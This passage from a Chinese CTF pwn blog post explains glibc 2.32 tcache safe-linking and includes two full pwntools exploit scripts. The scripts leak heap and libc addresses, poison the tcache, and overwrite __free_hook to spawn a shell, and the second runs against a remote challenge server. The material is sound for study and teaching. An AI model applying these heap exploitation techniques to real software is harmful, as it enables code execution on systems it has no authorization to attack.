are redundant (we could have just counted the linked list each</span></span><br><span class="line"><span class="comment">   time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">uint16_t</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure>

<p> 在libc2.32中，tcache_put函数如下，可以发现相对于libc-2.31的代码，key的值还是赋值为tcache，但是e的next指针发生了变化，不再是下一个tcache的地址，而是引入了一个宏<code>PROTECT_PTR</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there's room</span></span><br><span class="line"><span class="comment">   for more chunks.  */</span></span><br><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span></span><br><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as "in the tcache" so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> 我们找到相应的宏定义</p>
<p><a href="https://p1.ssl.qhimg.com/t01db66b24ae7a7e084.png" target="_blank" rel="noopener"><img src= "/img/loading.gif" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/t01db66b24ae7a7e084.png" alt="img"></a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line">  ((__typeof (ptr)) ((((<span class="keyword">size_t</span>) pos) &gt;&gt; <span class="number">12</span>) ^ ((<span class="keyword">size_t</span>) ptr)))</span><br></pre></td></tr></table></figure>

<p> 这个宏定义就是第一个参数右移12位再和第二个参数做一次异或，也就是说e-&gt;next会指向这个值，我们在gdb中查看，发现确实变为了一个奇怪的值。</p>
<p><a href="https://p3.ssl.qhimg.com/t01006b3f0b03b68502.png" target="_blank" rel="noopener"><img src= "/img/loading.gif" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/t01006b3f0b03b68502.png" alt="img"></a></p>
<p> 我们可以来验证一下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br></pre></td></tr></table></figure>

<p> 第一个参数是&amp;e-&gt;next，也就是这一个位置的地址，为0x55555555a2a0，第二个参数是tcache-&gt;entries[tc_idx]，因为当前tcache的链表其实是空的（之前还没有free过chunk），所以第二个参数值为0，我们用宏定义做一个运算，将第一个参数右移12位后异或0，发现得出的值与填入e-&gt;next的值一致。</p>
<p><a href="https://p4.ssl.qhimg.com/t01cbc030bfd7d04ead.png" target="_blank" rel="noopener"><img src= "/img/loading.gif" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/t01cbc030bfd7d04ead.png" alt="img"></a></p>
<p> 执行完tcache_put函数后就return了。值得关注的是libc2.32的safe-linking机制，就是在e-&gt;next位置不再直白的插入下一块chunk的地址，而是利用了地址随机化技术，将当前地址右移后与tcache链表尾部的地址做了一次异或再插入链表尾部。</p>
<p> 我们看malloc时发生了什么。</p>
<h5 id="malloc过程"><a href="#malloc过程" class="headerlink" title="malloc过程"></a>malloc过程</h5><p> 走到这里准备单步进入malloc函数</p>
<p><a href="https://p0.ssl.qhimg.com/t010039d90c0e404cc7.png" target="_blank" rel="noopener"><img src= "/img/loading.gif" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/t010039d90c0e404cc7.png" alt="img"></a></p>
<p> 准备进入tcache_get函数</p>
<p><a href="https://p2.ssl.qhimg.com/t01d0b4cd62f7806d01.png" target="_blank" rel="noopener"><img src= "/img/loading.gif" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/t01d0b4cd62f7806d01.png" alt="img"></a></p>
<p> tcache_get函数源代码如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there's</span></span><br><span class="line"><span class="comment">   available chunks to remove.  */</span></span><br><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *</span><br><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))</span><br><span class="line">    malloc_printerr (<span class="string">"malloc(): unaligned tcache chunk detected"</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = REVEAL_PTR (e-&gt;next);</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  e-&gt;key = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> 与libc2.31做对比的话，libc2.31是<code>tcache-&gt;entries[tc_idx] = e-&gt;next;</code></p>
<p> 而libc2.32是<code>tcache-&gt;entries[tc_idx] = REVEAL_PTR (e-&gt;next);</code></p>
<p> 多了一个宏定义REVEAL_PTR，我们展开后是<code>#define REVEAL_PTR(ptr) PROTECT_PTR (&amp;ptr, ptr)</code></p>
<p> 本质还是调用了PROTECT_PTR这个宏，我们观察参数，这个宏是让ptr的地址右移后和ptr做一次异或，即可恢复出e-&gt;next</p>
<p> 我们继续向后运行</p>
<p> 执行那个宏之前tcache_perthread_struct中的链表的值是如图所示的值</p>
<p><a href="https://p2.ssl.qhimg.com/t019d5db58633d61594.png" target="_blank" rel="noopener"><img src= "/img/loading.gif" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/t019d5db58633d61594.png" alt="img"></a></p>
<p> 执行后发生变化如图所示</p>
<p><a href="https://p2.ssl.qhimg.com/t016bfe88a7a81a4975.png" target="_blank" rel="noopener"><img src= "/img/loading.gif" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/t016bfe88a7a81a4975.png" alt="img"></a></p>
<p> 完整的构成了safe-linking机制。</p>
<h4 id="利用手法"><a href="#利用手法" class="headerlink" title="利用手法"></a>利用手法</h4><p> 在UAF的场景下，我们可以直接用show即可泄露出e-&gt;next值，因为最初tcache链表是为空的，也就是说safe-linking机制只相当于用堆地址右移了12位，通过左移即可恢复出堆地址，从而泄露出堆的基址，泄露出堆地址以后就可以来伪造tcache的next位了，我们可以在free态的chunk中修改next为<code>(&amp;next)&gt;&gt;12 &amp; __free_hook</code>（因为我们泄露出堆基址所以可以轻松的获取到&amp;next的值），这样调用完tcache<em>get之后就可以把\</em>_free_hook链入到可供我们申请的链表当中，即可覆写__free_hook来getshell。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">binary = <span class="string">'./UAF_glibc2.32'</span></span><br><span class="line">libc_path = <span class="string">'./libc-2.32.so'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    p = process(binary)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">()</span>:</span></span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(index, size, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'&gt;'</span>, <span class="string">'1'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'index'</span>, str(index))</span><br><span class="line">    p.sendafter(<span class="string">'size'</span>, str(size))</span><br><span class="line">    p.sendafter(<span class="string">'content:'</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'&gt;'</span>, <span class="string">'2'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'index'</span>, str(index))</span><br><span class="line">    p.sendafter(<span class="string">'content:'</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'&gt;'</span>, <span class="string">'4'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'index'</span>, str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'&gt;'</span>, <span class="string">'3'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'index'</span>, str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pack</span><span class="params">(pos, ptr)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> (pos &gt;&gt; <span class="number">12</span>) ^ ptr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gdbg</span><span class="params">()</span>:</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line">message = <span class="string">"======================== LEAK HEAP ADDRESS ======================"</span></span><br><span class="line">success(message)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x90</span>, <span class="string">'aaaa'</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">"?\n"</span>)</span><br><span class="line">heap = u64(p.recv(<span class="number">5</span>)[<span class="number">-5</span>:].ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">heap = heap &lt;&lt; <span class="number">12</span></span><br><span class="line">info(<span class="string">"HEAP BASE ----&gt; "</span> + hex(heap))</span><br><span class="line"></span><br><span class="line">message = <span class="string">"======================== LEAK LIBC ADDRESS ======================"</span></span><br><span class="line">success(message)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    add(i, <span class="number">0x80</span>, <span class="string">'dawn it'</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x80</span>, <span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x10</span>, <span class="string">'protect'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">edit(<span class="number">7</span>, <span class="string">'a'</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(</span><br><span class="line">    <span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>)) - <span class="number">193</span> - <span class="number">0x10</span> - libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">info(<span class="string">"LIBC ----&gt; "</span> + hex(libc_base))</span><br><span class="line">edit(<span class="number">7</span>, <span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line">message = <span class="string">"======================== TCACHE ATTACK ======================"</span></span><br><span class="line">success(message)</span><br><span class="line">__free_hook = libc_base + libc.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x20</span>, <span class="string">'aaaa'</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x20</span>, <span class="string">'bbbb'</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>, p64(pack(heap + <span class="number">0x730</span>, __free_hook)))</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x20</span>, <span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x20</span>, p64(libc_base + libc.sym[<span class="string">'system'</span>]))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="libc-2-32-限制分配堆块小于-0x80-打印1次、编辑2次"><a href="#libc-2-32-限制分配堆块小于-0x80-打印1次、编辑2次" class="headerlink" title="libc 2.32 + 限制分配堆块小于 0x80 + 打印1次、编辑2次"></a>libc 2.32 + 限制分配堆块小于 0x80 + 打印1次、编辑2次</h2><p>在 <code>glibc 2.32</code> 中引入了一个简单的异或加密机制：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there's room</span></span><br><span class="line"><span class="comment">   for more chunks.  */</span></span><br><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span></span><br><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as "in the tcache" so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there's</span></span><br><span class="line"><span class="comment">   available chunks to remove.  */</span></span><br><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *</span><br><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))</span><br><span class="line">    malloc_printerr (<span class="string">"malloc(): unaligned tcache chunk detected"</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = REVEAL_PTR (e-&gt;next);</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  e-&gt;key = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>一、新增了在从 tcache 中取出 chunk 时会检测 chunk 地址是否对齐的保护</p>
<p>二、引入了两个新的宏对 tcache 中存/取 chunk 的操作进行了一层保护，即在 new chunk 链接 tcache 中 old chunk 时会进行一次异或运算，代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line">  ((__typeof (ptr)) ((((<span class="keyword">size_t</span>) pos) &gt;&gt; <span class="number">12</span>) ^ ((<span class="keyword">size_t</span>) ptr)))</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span></span><br></pre></td></tr></table></figure>

<p>即 <strong>tcache_entry-&gt;next中存放的chunk地址为与自身地址进行异或运算后所得到的值</strong>， 这就要求我们在利用 tcache_entry 进行任意地址写之前 <strong>需要我们提前泄漏出相应 chunk 的地址，即我们需要提前获得堆基址后才能进行任意地址写</strong>，这给传统的利用方式无疑是增加了不少的难度</p>
<p>不过若是我们能够直接控制 <code>tcache struct</code>，则仍然可以直接进行任意地址写，这是因为在 tcache struct 中存放的仍是未经异或运算的原始 chunk 地址</p>
<h3 id="glibc2-32下堆基址的新泄露方式"><a href="#glibc2-32下堆基址的新泄露方式" class="headerlink" title="glibc2.32下堆基址的新泄露方式"></a>glibc2.32下堆基址的新泄露方式</h3><p>虽然这种简单的异或加密方式给 tcache 提高了不少的安全系数，但是同样也提供给我们新的泄露堆基址的途径</p>
<p>我们不难观察到，在 tcache 的一个 entry 中放入第一个 chunk 时，其同样会对该 entry 中的 “chunk” （NULL）进行异或运算后写入到将放入 tcache 中的 chunk 的 <code>fd</code> 字段，若是我们能够打印该 free chunk 的fd字段，<strong>便能够直接获得未经异或运算的堆上相关地址</strong></p>
<p><img src= "/img/loading.gif" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/image-20220808084042627.png" alt="image-20220808084042627"></p>
<p>重新回到题目，由于新机制的存在，若是我们想要通过 double free 进行任意地址写，则不仅需要清除 key 位，还需要获得堆基址，不过正如前面所讲到的，堆基址的泄露比以前更简单了些</p>
<p>但是本题只允许打印一次、编辑两次，后续的操作我们无疑还是需要泄露libc基址的，而打印的次数在泄露堆基址时已经用掉了</p>
<p>考虑到当我们将 tcache struct 送入 unsorted bin 中之后，其上会残留 main_arena + 0x60 的指针，而这个指针和 <code>stdout</code> 离得很近</p>
<p><img src= "/img/loading.gif" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/image-20220808084439469.png" alt="image-20220808084439469"></p>
<p>那么我们同样可以以 1/16 的几率爆破到 stdout 后修改 <code>_IO_write_base</code> 的低字节为 <code>\x00</code> 后便有一定几率泄露出 libc 基址</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="keyword">global</span> p</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)<span class="comment">#ELF('/lib/x86_64-linux-gnu/libc.so.6')#</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(command:int)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">b"&gt;&gt;"</span>)</span><br><span class="line">    p.sendline(str(command).encode())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size:int, content)</span>:</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"Size:"</span>)</span><br><span class="line">    p.sendline(str(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b"Content:"</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">()</span>:</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(content)</span>:</span></span><br><span class="line">    cmd(<span class="number">5</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"Content:"</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(hit_byte)</span>:</span></span><br><span class="line">    new(<span class="number">0x80</span>, <span class="string">b'arttnba3'</span>)</span><br><span class="line">    free()</span><br><span class="line">    show()</span><br><span class="line"></span><br><span class="line">    heap_leak = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">    heap_base = heap_leak * <span class="number">0x1000</span></span><br><span class="line">    log.success(<span class="string">'heap base: '</span> + hex(heap_base))</span><br><span class="line"></span><br><span class="line">    edit(<span class="string">b'arttnba3arttnba4'</span>)</span><br><span class="line">    free()</span><br><span class="line">    edit(p64(heap_leak ^ (heap_base + <span class="number">0x10</span>)))</span><br><span class="line">    new(<span class="number">0x80</span>, <span class="string">b'arttnba3'</span>)</span><br><span class="line">    new(<span class="number">0x80</span>, <span class="string">b'\x00\x00'</span> * (<span class="number">0xe</span> + <span class="number">0x10</span> + <span class="number">9</span>) + <span class="string">b'\x07\x00'</span>)</span><br><span class="line">    free()</span><br><span class="line"></span><br><span class="line">    new(<span class="number">0x40</span>, (<span class="string">b'\x00\x00'</span> * <span class="number">3</span> + <span class="string">b'\x01\x00'</span> + <span class="string">b'\x00\x00'</span> * <span class="number">2</span> + <span class="string">b'\x01\x00'</span>).ljust(<span class="number">0x70</span>, <span class="string">b'\x00'</span>)) <span class="comment"># unknown reason, bigger than 0x48 will failed.</span></span><br><span class="line">    new(<span class="number">0x30</span>, <span class="string">b'\x00'</span>.ljust(<span class="number">0x30</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">    new(<span class="number">0x10</span>, p64(<span class="number">0</span>) + <span class="string">b'\xc0'</span> + p8(hit_byte * <span class="number">0x10</span> + <span class="number">6</span>)) <span class="comment"># 1/16 to hit stdout</span></span><br><span class="line">    new(<span class="number">0x40</span>, p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + <span class="string">b'\x00'</span>)</span><br><span class="line"></span><br><span class="line">    libc_base = u64(p.recvuntil(<span class="string">b'\x7F'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>)) - <span class="number">0x1e4744</span></span><br><span class="line">    new(<span class="number">0x10</span>, p64(libc_base + libc.sym[<span class="string">'__free_hook'</span>]))</span><br><span class="line">    new(<span class="number">0x70</span>, p64(libc_base + libc.sym[<span class="string">'system'</span>]))</span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b'/bin/sh\x00'</span>)</span><br><span class="line">    free()</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    count = <span class="number">1</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            print(<span class="string">'the no.'</span> + str(count) + <span class="string">' try'</span>)</span><br><span class="line">            print(<span class="string">b'try: '</span> + <span class="string">b'\xc0'</span> + p8(i * <span class="number">0x10</span> + <span class="number">6</span>))</span><br><span class="line">            p = remote(<span class="string">'node3.buuoj.cn'</span>, <span class="number">26018</span>)<span class="comment">#process('./ff') #</span></span><br><span class="line">            exp(i)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br><span class="line">            p.close()</span><br><span class="line">            i = i + <span class="number">1</span></span><br><span class="line">            count = count + <span class="number">1</span></span><br><span class="line">            i = i % <span class="number">16</span></span><br><span class="line">            <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>

</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Ma9icCR</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://ma9iccr.github.io/2022-04/PWN%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-Code/">https://ma9iccr.github.io/2022-04/PWN%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-Code/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://ma9iccr.github.io" target="_blank">Ma9icCR</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/pwn/">pwn</a></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" 